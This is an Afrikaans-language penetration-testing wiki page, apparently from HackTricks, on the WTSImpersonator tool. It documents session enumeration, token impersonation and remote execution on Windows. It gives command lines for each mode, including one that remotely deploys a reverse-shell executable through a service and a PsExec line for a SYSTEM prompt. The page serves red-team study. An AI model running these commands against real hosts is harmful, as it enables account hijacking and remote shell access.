# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, deur Omri Baso, gebruik Windows Terminal Services APIs wat deur die `\\pipe\LSM_API_service` RPC named pipe blootgestel word om aangemelde sessies te enumerateer en 'n proses met 'n geselekteerde gebruiker se token te begin. Dit ondersteun plaaslike enumeration en uitvoering, sowel as remote service-based workflows.<sup>[[1]](#references)</sup>

## Kernfunksionaliteit

Die plaaslike execution flow gebruik die volgende API sequence:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Modules en gebruik

- **Enumereer gebruikers:** Die tool kan sessies op die plaaslike of 'n remote host enumereer.

- Plaaslik:
```bash
.\WTSImpersonator.exe -m enum
```
- Remote, spesifiseer 'n IP-adres of hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Voer commands uit:** Die `exec`- en `exec-remote`-modules benodig 'n service-konteks. Microsoft dokumenteer dat `WTSQueryUserToken` vereis dat die caller as `LocalSystem` met die `SE_TCB_NAME` privilege loop.<sup>[[2]](#references)</sup>

- Plaaslike command execution:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec kan 'n `LocalSystem` command prompt vir testing begin:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote command execution:** Die remote mode skep 'n service op die target in 'n PsExec-agtige workflow en vereis dus regte om daardie service te installeer en te begin.<sup>[[1]](#references)</sup>

- Voorbeeld:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User hunting:** Die `user-hunter`-module soek deur 'n host-lys vir 'n genoemde gebruiker se sessie en probeer om die verskafde program in daardie konteks uit te voer.<sup>[[1]](#references)</sup>
- Gebruikvoorbeeld:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: `WTSQueryUserToken` funksie](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
